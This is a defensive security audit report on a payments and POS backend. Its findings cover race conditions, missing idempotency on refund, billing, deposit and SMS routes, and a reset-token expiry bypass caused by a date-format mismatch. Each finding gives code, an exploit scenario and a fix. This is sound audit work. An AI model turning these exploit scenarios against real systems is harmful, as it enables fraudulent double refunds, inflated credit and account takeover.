

---

# SECURITY AUDIT — BACKEND — WAVE 2 (edge cases / second-order) — 2026-05-05

User feedback after Wave 1 (S01–S36): "barely deep — try harder." Wave 2 dispatched 30 additional sonnet agents focused on edge cases, second-order bugs, and dimensions Wave 1 under-covered.

**Methodology:** same `.security-findings/.PROTOCOL.md` (≥25–45 min, ≥60+ tool calls per agent). Each agent attacks one specific class of bug.

**Wave-2 slots:**

| Slot | Aspect |
|------|--------|
| T01 | Race conditions / TOCTOU across all SELECT-then-UPDATE patterns |
| T02 | Idempotency completeness matrix across money/state/email/SMS endpoints |
| T03 | Time/date edge cases — TZ drift, DST, epoch precision, future-dated abuse |
| T04 | Numeric edge cases — NaN/Infinity/MAX_SAFE_INTEGER/float drift on cents |
| T05 | Unicode normalization + homoglyph + zero-width + RTL override attacks |
| T06 | HTTP cache + CDN cache + browser cache poisoning |
| T07 | Open redirect / unsafe redirect targets |
| T08 | HTTP smuggling / proxy / raw-body parser ordering / cluster behind LB |
| T09 | JSON path / json_extract injection in better-sqlite3, FTS5 MATCH |
| T10 | DNS rebinding deeper — TOCTOU on resolution, IP pinning, redirect chain |
| T11 | Webhook precision — replay window, clock skew, dedup retention |
| T12 | ReDoS sweep — every regex against user input |
| T13 | Decompression bombs — zip / gzip / image / PDF / JSON / XML / SVG |
| T14 | Email header injection (CRLF) + attachment filename injection |
| T15 | SMTP relay abuse + from-domain spoofing + provider impersonation |
| T16 | Voice IVR / DTMF / TwiML manipulation |
| T17 | Audit log completeness matrix (every privileged op → audit row?) |
| T18 | Migration drift — schema/code mismatches, missing indexes, FK gaps |
| T19 | Resource exhaustion / DoS surface (conn / mem / DB / FD) |
| T20 | Symlink attack sweep beyond archive extraction |
| T21 | SQLite-specific — PRAGMA, ATTACH, recursive CTE DoS, FTS5 quirks |
| T22 | Tier/plan gate bypass + downgrade race + entitlement integrity |
| T23 | Audit-log tampering / append-only enforcement / log injection |
| T24 | Test fixtures / sample data / seed — real-data + dev creds leak |
| T25 | Dependency CVEs / outdated libs / supply-chain risk |
| T26 | Subresource Integrity / CDN script tampering on admin HTML |
| T27 | Long-running tasks / promise leaks / unhandled rejection |
| T28 | WebSocket per-message-type authz matrix + broadcast scoping |
| T29 | Provider/3rd-party API response trust boundary |
| T30 | Chained-exploit / second-order analysis (combines Wave-1 + Wave-2 findings) |

**Cumulative volume:** Wave 1 (~570 KB / 8608 lines, 36 slots) + Wave 2 (~430 KB / 6291 lines, 30 slots) = 66 specialized agents covering 66 distinct classes.

---



---

# T01-races-toctou

# T01 — Race Conditions / TOCTOU

**Scope:** All financial routes, cron services, utils, DB layer  
**Investigator:** Agent T01  
**Date:** 2026-05-06

---

### CRITICAL — Invoice payment: concurrent INSERT→SUM→SET clobbers amount_paid

**Where:** `packages/server/src/routes/invoices.routes.ts:779–806`

**What:**
`POST /:id/payments` inserts the payment row, then reads `SUM(amount)` of all payments, then writes the computed total back with `UPDATE invoices SET amount_paid = ?, amount_due = ?, status = ?`. The INSERT and the UPDATE are two separate `await adb.run()` calls with no wrapping transaction and no optimistic lock on the existing `amount_paid` value. Two concurrent payment requests will both insert their rows, both execute the SUM (which may or may not include the other's row depending on timing), and both SET `amount_paid` to their computed snapshot — last writer silently overwrites the first's balance contribution.

**Code:**
```typescript
const paymentResult = await adb.run(`
  INSERT INTO payments (invoice_id, amount, ...) VALUES (?, ?, ...)
`, req.params.id, amount, ...);

const totalPaidRow = await adb.get<{ t: number }>(
  'SELECT SUM(CASE WHEN amount >= 0 THEN amount ELSE 0 END) as t FROM payments WHERE invoice_id = ?',
  req.params.id);
const totalPaid = roundCents(totalPaidRow?.t || 0);

await adb.run(`
  UPDATE invoices SET amount_paid = ?, amount_due = ?, status = ? WHERE id = ?
`, totalPaid, displayAmountDue, status, req.params.id);
```

**Exploit:**
Attacker (or two browser tabs) posts two partial payments of $50 each against a $100 invoice in rapid succession. Both INSERT succeed; both SUM might see only one row or both rows depending on SQLite scheduling; one UPDATE overwrites the other. The invoice records $50 paid (not $100) yet two payment rows exist — the customer is billed twice but the invoice shows as only partially paid, or the invoice is marked `paid` with only $50 recorded.

**Fix:**
Wrap the INSERT + SUM + UPDATE in a single `adb.transaction([...])` batch so the three statements execute atomically within one worker. Alternatively, replace the read-SUM-write with a differential update: `UPDATE invoices SET amount_paid = amount_paid + ?, amount_due = amount_due - ? WHERE id = ?` using only the current payment's amount, eliminating the SUM read entirely.

---

### HIGH — Credit note cap: non-atomic SUM check allows over-crediting

**Where:** `packages/server/src/routes/invoices.routes.ts:1192–1213`

**What:**
`POST /:id/credit-note` reads the sum of prior credit notes (`SELECT COALESCE(SUM(-total),0) … WHERE credit_note_for = ?`), compares against `original.total`, and only then inserts the new credit note row. There is no wrapping transaction and no idempotency middleware on this route. Two concurrent credit-note requests for the same invoice will both see the same `alreadyCredited` value, both pass the cap check, and both insert — potentially issuing credit totalling `2 × amount` against an invoice of `original.total`, handing the customer free store credit.

**Code:**
```typescript
const priorCredits = await adb.get<{ total_credit: number }>(
  'SELECT COALESCE(SUM(-total), 0) AS total_credit FROM invoices WHERE credit_note_for = ?',
  invoiceId);
const alreadyCredited = roundCents(priorCredits?.total_credit ?? 0);
if (roundCents(alreadyCredited + amount) > roundCents(original.total)) {
  throw new AppError(`Credit note total would exceed invoice total ...`, 400);
}
// ... (no transaction, no idempotency key) ...
const cnResult = await adb.run(`INSERT INTO invoices ...`, ...);
```

**Exploit:**
Staff member (or script) sends two identical `POST /invoices/42/credit-note` requests for the full invoice amount simultaneously. Both read `alreadyCredited = 0`, both pass the guard, both insert a credit note for the full amount. The customer receives twice the invoice total as store credit.

**Fix:**
Add `idempotent` middleware to this route (same pattern as `POST /:id/payments`), or replace the separate SELECT + INSERT with a single conditional INSERT: `INSERT INTO invoices ... SELECT ... WHERE (SELECT COALESCE(SUM(-total),0) FROM invoices WHERE credit_note_for=?) + ? <= (SELECT total FROM invoices WHERE id=?)` with `expectChanges: true` inside an `adb.transaction()` batch.

---

### HIGH — Overpayment / credit-note overflow: store credit snapshot UPDATE loses concurrent increment

**Where:** `packages/server/src/routes/invoices.routes.ts:828–844` and `1263–1279`

**What:**
Both the overpayment path (payment route) and the credit-note overflow path read the current `store_credits.amount`, add the new delta in JavaScript, and write back the computed sum with `UPDATE store_credits SET amount = <snapshot + delta>`. This is a read-modify-write with an async gap. Two concurrent requests that both produce a store credit addition for the same customer will each read the same original balance, compute their own incremented value, and the last writer silently discards the first's addition.

**Code:**
```typescript
const existingCredit = await adb.get<{ id: number; amount: number }>(
  'SELECT id, amount FROM store_credits WHERE customer_id = ?', invoice.customer_id);
if (existingCredit) {
  await adb.run(
    "UPDATE store_credits SET amount = ?, updated_at = datetime('now') WHERE id = ?",
    roundCents((existingCredit.amount || 0) + overpayment),  // snapshot + delta, not differential
    existingCredit.id);
}
```

**Exploit:**
Customer pays two invoices simultaneously, both of which produce overpayment store credits of $10. Both reads return `amount = 0`, both compute `0 + 10 = 10`, both write $10 — net balance is $10 instead of $20. One $10 credit silently vanishes.

**Fix:**
Replace with a differential UPDATE: `UPDATE store_credits SET amount = amount + ?, updated_at = datetime('now') WHERE id = ?`. For the INSERT branch add an `ON CONFLICT(customer_id) DO UPDATE SET amount = amount + excluded.amount` to handle races between two concurrent first-credit writes.

---

### HIGH — Membership billing: duplicate route registration causes shadow + double-charge TOCTOU

**Where:** `packages/server/src/routes/membership.routes.ts:317` and `452–526`

**What:**
Two `router.post('/:id/run-billing', ...)` handlers are registered on the same router. Express resolves the **last** registered handler (line 452), making the first (line 317) unreachable dead code. Beyond the shadow: the active handler (line 452) reads `sub.current_period_end`, checks `periodEnd > Date.now()` in JavaScript (line 483–485), then calls `chargeToken` (an async external HTTP call), then writes `UPDATE customer_subscriptions SET current_period_end = ? WHERE id = ?` with **no** `WHERE current_period_end = <snapshot>` guard. Two concurrent admin calls with `?force=1` will both pass the period-end check, both hit the payment processor, and both advance `current_period_end` — charging the customer twice for the same billing cycle.

**Code:**
```typescript
// line 483–490: JS-only period check, no DB lock
if (!force && sub.current_period_end) {
  const periodEnd = Date.parse(sub.current_period_end);
  if (!Number.isNaN(periodEnd) && periodEnd > Date.now()) {
    throw new AppError('Subscription billing period has not ended yet...', 409);
  }
}
const chargeResult = await chargeToken(db, sub.blockchyp_token, amount.toFixed(2), description);
// ... then unconditional UPDATE, no WHERE current_period_end = snapshot
await adb.run(
  `UPDATE customer_subscriptions SET status='active', current_period_end=?, ... WHERE id=?`,
  newPeriodEnd, amount, id);
```

**Exploit:**
Admin calls `POST /subscriptions/7/run-billing?force=1` twice in rapid succession (or two admins click simultaneously). Both pass the period-end check (same snapshot), both charge the customer's card, both advance `current_period_end` — customer is double-charged. Additionally, dead first handler could be accidentally revived by a route ordering change, causing the incomplete handler to serve requests.

**Fix:**
Remove the dead first handler (line 317). Add an optimistic concurrency guard to the UPDATE: `WHERE id = ? AND current_period_end = ?` using the snapshot value; check `changes === 0` and throw 409. Insert the `subscription_payments` row inside the same `adb.transaction()` batch as the UPDATE so both are atomic.

---

### MEDIUM — Installment plan cancel: UPDATE missing WHERE status guard

**Where:** `packages/server/src/routes/installments.routes.ts:226–236`

**What:**
The cancel route reads the current status with a separate `SELECT`, throws if already completed/cancelled, then issues `UPDATE installment_plans SET status = 'cancelled' WHERE id = ?`. The WHERE clause has no status condition. A race between a concurrent "complete plan" operation and a cancel request can result in both passing the JS status check (both see `status='active'`), the plan being marked completed, and then overwritten to `cancelled` — or vice versa — with no indication that a status conflict occurred.

**Code:**
```typescript
const existing = await adb.get<{ status: string }>(
  'SELECT status FROM installment_plans WHERE id = ?', id);
if (existing.status === 'completed' || existing.status === 'cancelled') {
  throw new AppError(`Cannot cancel a plan in '${existing.status}' status`, 409);
}
await adb.run(
  `UPDATE installment_plans SET status = 'cancelled' WHERE id = ?`,
  id,
);
```

**Exploit:**
Two admin requests race: one cancels, one closes the plan as completed. Both read `status='active'`, both pass the guard. Whichever UPDATE fires last wins — a completed plan can be silently overwritten to `cancelled`, destroying billing history integrity.

**Fix:**
Add status condition to the UPDATE: `WHERE id = ? AND status NOT IN ('completed', 'cancelled')`. Check `result.changes === 0` and throw 409 — this makes the check-and-act atomic without needing a separate transaction.

---

### MEDIUM — POS: MAX()-based fallback counter paths are racy on un-migrated tenants

**Where:** `packages/server/src/routes/pos.routes.ts:601–604`, `1187–1190`, `1593–1594`, `1926–1927`, `2589–2592`

**What:**
Five catch-blocks fall back to `SELECT COALESCE(MAX(CAST(SUBSTR(order_id, N) AS INTEGER)), 0) + 1` when `allocateCounter()` throws (e.g. tenant DB missing migration 072). Multiple concurrent POS transactions on an un-migrated tenant will all receive the same computed MAX+1 value, producing duplicate `order_id` values. Depending on the unique constraint presence, this either causes a silent `INSERT OR IGNORE` loss or an unhandled 500 error. The fallback is also poisonable by any non-numeric `order_id` prefix already in the table.

**Code:**
```typescript
} catch {
  const seqRow = await adb.get<{ next_num: number }>(
    "SELECT COALESCE(MAX(CAST(SUBSTR(order_id, 5) AS INTEGER)), 0) + 1 as next_num FROM invoices",
  );
  orderId = generateOrderId('INV', seqRow!.next_num);
}
```

**Exploit:**
Tenant whose DB has not yet run migration 072 processes two simultaneous POS sales. Both fallback paths return `next_num = 101`. Both attempt to insert with `order_id = 'INV-101'`. One silently fails or throws, and the failed transaction is not retried — the sale is lost.

**Fix:**
In the catch block, re-throw if the error is not `no such table: counters` (a deliberate migration-absent case). For the legitimate fallback, wrap the MAX SELECT + INSERT in a `db.transaction()` so the read and use are serialized. Longer term: backfill migration 072 on all tenant DBs during startup and remove the fallback paths entirely.

---

### INFO — `checkLockoutRate` not wrapped in transaction (cosmetic gap, low-risk)

**Where:** `packages/server/src/utils/rateLimiter.ts:106–124`

**What:**
`checkLockoutRate` reads the rate-limit row and conditionally DELETEs it if the lockout has expired, but the SELECT and the DELETE are not wrapped in a transaction. Concurrent TOTP attempts could both see an expired lockout row, both execute the DELETE (second hits 0 rows), and both proceed — this is harmless because neither has yet recorded a failure, but the pattern is inconsistent with the transactional `checkWindowRate` added in SCAN-1065. Actual recording of TOTP failures uses the atomic `INSERT ... ON CONFLICT DO UPDATE` in `recordLockoutFailure`, so the practical impact is negligible.

**Code:**
```typescript
if (row.locked_until && now > row.locked_until) {
  db.prepare('DELETE FROM rate_limits WHERE category = ? AND key = ?').run(category, key);
  return true;  // second concurrent call also returns true after deleting 0 rows
}
```

**Exploit:**
Negligible. Both concurrent callers return `true` (allowed) for an expired lockout, which is correct behavior — the lockout was already expired. The worst case is one extra TOTP attempt slot on an expired lockout.

**Fix:**
Wrap the SELECT + conditional DELETE in `db.transaction()` for consistency with `checkWindowRate`, or use `DELETE FROM rate_limits WHERE category=? AND key=? AND locked_until < ?` (single atomic statement) and return `true` if `changes >= 1`.

---


---

# T02-idempotency

# T02 — Idempotency Completeness Matrix

**Slot:** T02  
**Scope:** `packages/server/src/middleware/idempotency.ts`, all required-idempotent endpoints  
**Date:** 2026-05-06

---

## Middleware baseline (verified sound)

`middleware/idempotency.ts` stores keys in per-tenant SQLite (`idempotency_keys`, migration 112).  
UNIQUE(user_id, key) prevents cross-request races. Hash covers METHOD + path + body. TTL = 24 h via retentionSweeper.  
24-hour window is shorter than Stripe's recommended 7 days but acceptable for this payment surface.  
Truncated-body recovery (SCAN-1153) is handled. No in-memory store; cluster-safe.

---

### [HIGH] /pos/return missing idempotent middleware — double refund + double credit note on retry

**Where:** `packages/server/src/routes/pos.routes.ts:2496`

**What:**
`POST /pos/return` creates a credit note invoice, refund record, and stock movements in sequence. It has no `idempotent` middleware and no UNIQUE database constraint to prevent duplicate processing. A client retrying after a 5xx (e.g. network timeout) re-executes all inserts, creating two credit note invoices and two refund rows for the same original invoice items.

**Code:**
```typescript
router.post('/return', asyncHandler(async (req, res) => {
  // ...
  const creditResult = await adb.run(`
    INSERT INTO invoices (...) VALUES (?, ?, ?, ...)
  `, creditOrderId, invoice.customer_id, -creditTotal, ...);
  // ...
  await adb.run(`
    INSERT INTO refunds (invoice_id, customer_id, amount, ...) VALUES (...)
  `, invId, invoice.customer_id, creditTotal, ...);
  // no idempotency guard on any of these inserts
```

**Exploit:**
A double-click or automatic retry on network error causes the handler to run twice. Two negative invoices (credit notes) are created for the same line items. If the credit is applied to the customer's balance, the customer receives twice the store credit. Stock is restored twice (double the inventory).

**Fix:**
Add `idempotent` middleware: `router.post('/return', requireAdmin, idempotent, asyncHandler(...))`. Alternatively add a UNIQUE constraint on `(original_invoice_id, order_id)` in the invoices table to catch the duplicate at the DB level.

---

### [HIGH] /membership/:id/run-billing race — two concurrent requests both charge card before guard updates

**Where:** `packages/server/src/routes/membership.routes.ts:317` and `packages/server/src/routes/membership.routes.ts:452`

**What:**
Both `POST /membership/:id/run-billing` implementations check `current_period_end > now()` and throw 409 if true. However, the check (SELECT) and the period-advance UPDATE are not atomic. Two concurrent admin requests that arrive within milliseconds of each other both read `current_period_end ≤ now()`, both pass the guard, both call `chargeToken()`, and both insert into `subscription_payments`. The second UPDATE simply overwrites the period with the same value, hiding the double charge in the payments table.

**Code:**
```typescript
// Both handlers follow this pattern:
if (!force && sub.current_period_end) {
  const periodEnd = Date.parse(sub.current_period_end);
  if (!Number.isNaN(periodEnd) && periodEnd > Date.now()) {
    throw new AppError('...not yet due...', 409);
  }
}
// async charge — no DB-level lock held between the check and the charge
const chargeResult = await chargeToken(db, sub.blockchyp_token, ...);
// UPDATE runs after the async charge; another request can charge between here and above
await adb.run(`UPDATE customer_subscriptions SET current_period_end = ? WHERE id = ?`, newEnd, id);
```

**Exploit:**
Two staff members double-click "Charge now" within the same second. Both pass the time guard, both dispatch a BlockChyp charge, and the customer is billed twice. The second `subscription_payments` row looks like a normal renewal record — there is no uniqueness constraint to catch it.

**Fix:**
Use an atomic `UPDATE ... WHERE id = ? AND (current_period_end IS NULL OR current_period_end <= datetime('now'))` and check `changes === 0` before calling `chargeToken`. Only proceed with the charge if the UPDATE row was claimed (optimistic lock). Add `idempotent` middleware as belt-and-suspenders.

---

### [HIGH] Membership renewal cron lacks overlap guard — concurrent ticks both charge same subscriptions

**Where:** `packages/server/src/index.ts:2205` (trackInterval) + `packages/server/src/index.ts:2251–2296`

**What:**
`trackInterval(membershipCronBody, 3600_000)` fires every hour. `trackInterval` is a plain `setInterval` wrapper with no "already running" guard. If the previous tick's async work (network calls to BlockChyp per subscription per tenant) takes longer than one hour, a second tick fires while the first is still awaiting `chargeToken()`. Both ticks independently SELECT subscriptions where `current_period_end <= now()`, and both charge the same subscriptions before either one UPDATEs `current_period_end`. The `subscription_payments` table has no UNIQUE constraint to block the duplicate row.

**Code:**
```typescript
trackInterval(async () => {
  // ...
  await forEachDbAsync(async (slug, tenantDb) => {
    // per-tenant timeout is 10 min; with many tenants total > 60 min
    await Promise.race([membershipTenantWork(slug, tenantDb), timeout]);
  });
  // ...
  // membershipTenantWork:
  const result = await chargeToken(...);  // async — yields event loop
  // second tick can enter and SELECT before this UPDATE fires:
  tenantDb.prepare(`UPDATE customer_subscriptions SET current_period_end = ? WHERE id = ?`)
    .run(newEndStr, sub.id);
}, 3600_000);
```

**Exploit:**
A tenant with ≥6 monthly-due memberships and slow BlockChyp network latency can cause the first cron tick to exceed 1 hour. The second tick fires, selects the same due subscriptions (period not yet advanced), and re-charges all of them. Each affected customer is billed twice for the same month; the double charge appears as a normal `subscription_payments` row.

**Fix:**
Add an `isRunning` flag (or use a per-tenant `SELECT ... FOR UPDATE` equivalent via an `UPDATE ... WHERE id = ? AND current_period_end <= datetime('now')` claim before charging). At minimum, add a `UNIQUE(subscription_id, period_start_approx)` constraint to `subscription_payments` or store the `transaction_id` with a UNIQUE constraint to prevent duplicate charge records.

---

### [MEDIUM] /deposits POST — no idempotent middleware; double-click creates duplicate deposits

**Where:** `packages/server/src/routes/deposits.routes.ts:145`

**What:**
`POST /deposits` is rate-limited to 20 creates per user per minute but has no `idempotent` middleware and no UNIQUE database constraint to prevent simultaneous or rapid-retry duplicate deposits. A double network submission within the same second creates two deposit rows for the same `customer_id`/`ticket_id`/`amount` triple.

**Code:**
```typescript
router.post('/', requirePermission('deposits.create'), asyncHandler(async (req: Request, res: Response) => {
  // rate limit: 20/min — does not prevent same-second duplicates
  // ...
  const txResults = await req.asyncDb.transaction([{
    sql: `INSERT INTO deposits (customer_id, ticket_id, amount_cents, ...)`,
    params: [customerId, ticketId, amountCents, ...],
  }]);
  // no idempotency key check
```

**Exploit:**
A UI double-click or mobile network retry on a 503 response creates two deposit records. If both are applied to an invoice, the invoice is over-credited by the deposit amount. Alternatively, the customer's deposit balance is inflated.

**Fix:**
Add `idempotent` middleware to this route. The client already has session context to generate a per-deposit key.

---

### [MEDIUM] /gift-cards/:id/redeem and /:id/reload — no idempotent middleware; double-click risks

**Where:** `packages/server/src/routes/giftCards.routes.ts:328` (redeem), `packages/server/src/routes/giftCards.routes.ts:396` (reload)

**What:**
`POST /gift-cards/:id/redeem` uses an atomic guarded decrement (`WHERE current_balance >= amount`) which prevents double-spend if both requests reach the DB. However, if the first request succeeds but the response is lost in transit (client gets a 502), the client retries. The second attempt hits the guard (`current_balance < amount`) and returns 409 — but the first redemption was already committed. Without `idempotent` middleware, there is no way for the client to retrieve the original success response; the retry fails with a misleading error. For `reload`, two concurrent requests both succeed (differential `+= amount`) — no guard prevents double-reloading the same amount twice.

**Code:**
```typescript
router.post('/:id/redeem', requirePermission('gift_cards.redeem'), asyncHandler(async (req, res) => {
  // atomic decrement guard prevents double-spend by the same request body
  // BUT: no idempotent middleware means retry after network loss returns 409 with no replay path
  // reload:
router.post('/:id/reload', requirePermission('gift_cards.reload'), asyncHandler(async (req, res) => {
  // differential += means two requests both succeed — no guard
```

**Exploit:**
For reload: a POS terminal retries after a 503. The gift card balance is incremented twice. For redeem: a network-lost success means the customer's redemption is accepted but the client shows an error; if staff manually re-try, the second attempt correctly 409s but without an idempotency replay the cashier cannot distinguish "already redeemed" from "insufficient balance".

**Fix:**
Add `idempotent` middleware to both endpoints. For reload, the middleware ensures a retry returns the original success response without re-applying the `+= amount`.

---

### [MEDIUM] /installments POST — no idempotent middleware; double-submit creates duplicate payment plans

**Where:** `packages/server/src/routes/installments.routes.ts:38`

**What:**
`POST /installments` creates an installment plan with a schedule. No `idempotent` middleware and no UNIQUE constraint on `(customer_id, invoice_id)` means a double-click or retry creates two active installment plans for the same invoice.

**Code:**
```typescript
router.post('/', asyncHandler(async (req: Request, res: Response) => {
  // rate limit: 20/min — does not prevent same-second duplicates
  // no idempotency key check
  // INSERT INTO installment_plans (customer_id, invoice_id, total_cents, ...)
```

**Exploit:**
A UI double-submit creates two active installment plans. Both generate scheduled payment rows. The customer may be charged the full invoice balance twice across both plans.

**Fix:**
Add `idempotent` middleware. Alternatively add `UNIQUE(invoice_id)` or `UNIQUE(customer_id, invoice_id)` with a `status NOT IN ('cancelled')` partial index to the `installment_plans` table.

---

### [MEDIUM] /campaigns/:id/run-now — no idempotent middleware; double-run sends duplicate SMS/email blasts

**Where:** `packages/server/src/routes/campaigns.routes.ts:673`

**What:**
`POST /campaigns/:id/run-now` has a `rateLimitCampaignDispatch` guard but no `idempotent` middleware and no UNIQUE constraint on `campaign_sends(campaign_id, customer_id)`. The `fetchEligibleRecipients` helper does not exclude customers who already received the campaign in the current run. A retry on a 5xx error (or a staff member clicking "Send" twice) re-dispatches the campaign to all eligible recipients, creating duplicate SMS/email rows per customer.

**Code:**
```typescript
router.post('/:id/run-now', asyncHandler(async (req, res) => {
  rateLimitCampaignDispatch(req);  // only limits rate, not idempotency
  const recipients = await fetchEligibleRecipients(adb, campaign);
  // fetchEligibleRecipients does NOT filter out customers with existing campaign_sends rows
  const result = await dispatchCampaign(db, adb, req.tenantSlug || null, campaign, recipients);
  // campaign_sends has no UNIQUE(campaign_id, customer_id)
```

**Exploit:**
A staff member double-clicks "Send campaign". Both requests reach the server. Depending on `rateLimitCampaignDispatch` window (per-user, not per-campaign-dispatch), both may succeed. Every recipient receives two SMS or email messages. Carrier anti-spam systems may flag the shop's number/domain.

**Fix:**
Add `idempotent` middleware to this endpoint. Also add `UNIQUE(campaign_id, customer_id)` partial index (e.g. `WHERE status = 'sent'`) to `campaign_sends` to prevent a re-run from inserting duplicate successful send rows.

---

### [MEDIUM] Inbound SMS webhook — no deduplication on provider_message_id; provider replays create duplicate messages and double auto-responses

**Where:** `packages/server/src/routes/sms.routes.ts:1026–1037`

**What:**
The inbound SMS webhook handler inserts a new `sms_messages` row unconditionally on every delivery. `provider_message_id` (migration 005) is a nullable TEXT column with no UNIQUE constraint, and the handler does not check for an existing row with the same `provider_message_id` before inserting. Twilio and other SMS providers retry webhook delivery on non-2xx responses or on their own timeout. If the server responds slowly or crashes mid-handler, the provider replays the webhook and a second identical inbound message row is created. The auto-responder then fires again for the duplicate.

**Code:**
```typescript
// sms_messages table — migration 001_initial.sql:762
CREATE TABLE IF NOT EXISTS sms_messages (
    provider_message_id TEXT,   -- no UNIQUE constraint
    ...
);

// sms.routes.ts:1026 — handler
const result = await adb.run(`
  INSERT INTO sms_messages (from_number, ..., provider_message_id, ...)
  VALUES (?, ..., ?, ...)   -- no INSERT OR IGNORE, no pre-check
`, from, ..., providerId || null, ...);
// auto-responder fires on every insert
```

**Exploit:**
SMS provider retries an inbound message webhook three times (common on slow responses). Three rows are created. If an auto-responder rule matches, three outbound replies are sent to the customer. For STOP keyword handling, the opt-out is applied three times (harmless but noisy audit trail).

**Fix:**
Add `UNIQUE(provider_message_id) WHERE provider_message_id IS NOT NULL` partial index on `sms_messages`. Change the INSERT to `INSERT OR IGNORE INTO sms_messages` and check `lastInsertRowid === 0` to skip auto-responder/opt-out processing on replay.

---

### [LOW] /sms/send — no idempotent middleware; rapid retries send duplicate SMS per customer

**Where:** `packages/server/src/routes/sms.routes.ts:491`

**What:**
`POST /sms/send` is rate-limited to 5 per user per minute with a daily tenant cap. There is no `idempotent` middleware. A client retry on a 503 (e.g. provider timeout where the SMS was actually sent) creates a second outbound message row and sends a second SMS to the customer. The rate limit does not prevent two requests within the same second.

**Code:**
```typescript
router.post('/send', async (req, res, next) => {
  // rate limit: 5/min — does not block same-second duplicate
  const msgId = (await adb.run(`INSERT INTO sms_messages ...`)).lastInsertRowid;
  const providerResult = await sendSms(to, body, storePhone, ...);
  // no idempotency key check
```

**Exploit:**
POS workstation retries after a 503. The SMS was already sent by the provider on the first attempt (provider accepted but server crashed before writing success status). Customer receives the same message twice.

**Fix:**
Add `idempotent` middleware. Alternatively require the client to supply an `X-Idempotency-Key` and check it against the outgoing `sms_messages` table before dispatching to the provider.

---

### [LOW] Outbound webhook delivery — no event-level dedup key; server crash between fire-and-retry can replay event

**Where:** `packages/server/src/services/webhooks.ts:378` (`deliverWithRetry`)

**What:**
`fireWebhook` is fire-and-forget. On success after a retry, the delivery is not recorded anywhere; on final failure, a `webhook_delivery_failures` row is inserted but with no event-content hash. If the server crashes after a successful first attempt but before the request handler completes (killing the in-flight retry goroutine), `fireWebhook` runs again on the next request that triggers the same event type, sending the same logical event to the receiver for a second time. The `webhook_delivery_failures` table has no `payload_hash` UNIQUE to detect this.

**Code:**
```typescript
async function deliverWithRetry(...): Promise<void> {
  for (let i = 0; i < RETRY_BACKOFF_MS.length; i++) {
    // ...
    const result = await attemptDelivery(endpoint, body, signature, timestamp);
    if (result.ok) return;  // no "we delivered" marker persisted
  }
  recordDeliveryFailure(...);  // only on total failure, no idempotency row
}
```

**Exploit:**
A `ticket_created` event fires. The first delivery succeeds (HTTP 200), but the server process crashes milliseconds later. The async IIFE is orphaned. On the next `ticket_created` event, `fireWebhook` fires again — and while this is a *different* ticket, there is no mechanism to prevent the *same* ticket event from being replayed on a crash loop. Receivers that trigger side-effects (e.g., create a record in another system) on each delivery will see duplicates.

**Fix:**
Persist a `webhook_deliveries` record (with a payload hash or event+entity-id key) as `INSERT OR IGNORE` before attempting delivery. Check for an existing successful row before re-dispatching. This closes the crash-replay gap and provides an audit trail for successful deliveries.

---

## COVERED (not vulnerable)

- **POST /pos/transaction, /pos/sales, /pos/checkout-with-ticket** — `idempotent` middleware wired (lines 253, 941, 1384).
- **POST /refunds** — `idempotent` middleware wired (line 107).
- **POST /invoices, /invoices/:id/payments** — `idempotent` middleware wired (lines 443, 731).
- **POST /tickets** — `idempotent` middleware wired (line 892).
- **POST /blockchyp/process-payment** — custom `payment_idempotency` table with `(invoice_id, client_request_id, user_id)` UNIQUE + 30s dedup window (lines 237–279).
- **POST /billing/webhook (Stripe)** — `stripe_webhook_events.stripe_event_id` PRIMARY KEY dedupe in `handleWebhookEvent` (stripe.ts:744–752).
- **POST /signup** — UNIQUE slug constraint in `tenants` table prevents duplicate provisioning (tenant-provisioning.ts:242).
- **POST /membership/subscribe** — UNIQUE partial index on `customer_subscriptions(customer_id) WHERE status IN ('active','past_due')` prevents double-subscription (migration 110).
- **Dunning cron** — `UNIQUE(invoice_id, sequence_id, step_index)` on `dunning_runs` makes runs idempotent (dunningScheduler.ts:7).
- **Idempotency middleware TTL** — 24h via retentionSweeper (`retentionDays: 1`); acceptable for POS flows (Stripe SDK recommends 7 days but those use dedicated payment_idempotency table).
- **Idempotency key scoping** — `user_id` column + UNIQUE(user_id, key) prevents cross-user key collisions (migration 112).
- **No in-memory store** — SQLite-backed, survives restarts, works across processes sharing the same tenant DB.


---

# T03-time-date

# T03 — Time/Date Edge-Case Security Findings

**Auditor slot:** T03  
**Scope:** Timezone, DST, epoch overflow, clock skew, leap-day, future-date abuse  
**Focus files:** `routes/auth.routes.ts`, `services/dunningScheduler.ts`, `recurringInvoicesCron.ts`, `slaBreachCron.ts`, `retentionSweeper.ts`, `dataExportScheduleCron.ts`, `services/automations.ts`, `utils/repair-time.ts`  
**Date completed:** 2026-05-06

---

### [HIGH] Password-reset token expiry bypassed — ISO 8601 vs SQLite `datetime()` format mismatch

**Where:** `packages/server/src/routes/auth.routes.ts:1720` (store) and `:1814`, `:1856` (verify)

**What:**
`reset_token_expires` is written via `new Date(...).toISOString()`, producing `'YYYY-MM-DDTHH:MM:SS.mmmZ'` (capital-T separator, milliseconds, Z suffix). The expiry guard then compares against `datetime('now')`, which SQLite returns as `'YYYY-MM-DD HH:MM:SS'` (space separator, no ms). SQLite TEXT comparison is purely lexicographic: ASCII 'T' (84) is greater than ASCII ' ' (32), so any ISO string shares the same `YYYY-MM-DD` prefix as `datetime('now')` and the comparison `reset_token_expires > datetime('now')` evaluates TRUE for the **entire remainder of the calendar day** once the token is logically expired. A 1-hour reset token issued at 08:00 UTC is still accepted at 23:59 UTC.

**Code:**
```typescript
// auth.routes.ts:1720 — stored with 'T' separator
const expiresAt = new Date(Date.now() + 60 * 60 * 1000).toISOString();
// ...
await adb.run(
  'UPDATE users SET reset_token = ?, reset_token_expires = ? WHERE id = ?',
  tokenHash, expiresAt, user.id
);

// auth.routes.ts:1814 — compared against SQLite datetime('now') with space separator
const user = await adb.get<{ id: number; username: string }>(
  "SELECT id, username FROM users WHERE reset_token = ? AND reset_token_expires > datetime('now') AND is_active = 1",
  tokenHash,
);
// auth.routes.ts:1856 — same comparison inside the reset-commit transaction
```

**Exploit:**
An attacker who intercepts or obtains a password-reset link (phishing, email forwarding, shared device) after its 1-hour logical expiry can still use it any time until UTC midnight of the day it was issued — up to 23 hours of extra validity. Combined with token-hash exposure (e.g., read-only DB access, logs), this extends the account-takeover window significantly.

**Fix:**
Store the expiry as a SQLite-compatible string: `new Date(...).toISOString().replace('T', ' ').slice(0, 19)`. Alternatively keep `toISOString()` but change the WHERE clause to `reset_token_expires > strftime('%Y-%m-%dT%H:%M:%fZ', 'now')` — but the replace approach is simpler and consistent with every other date stored in this schema.

---

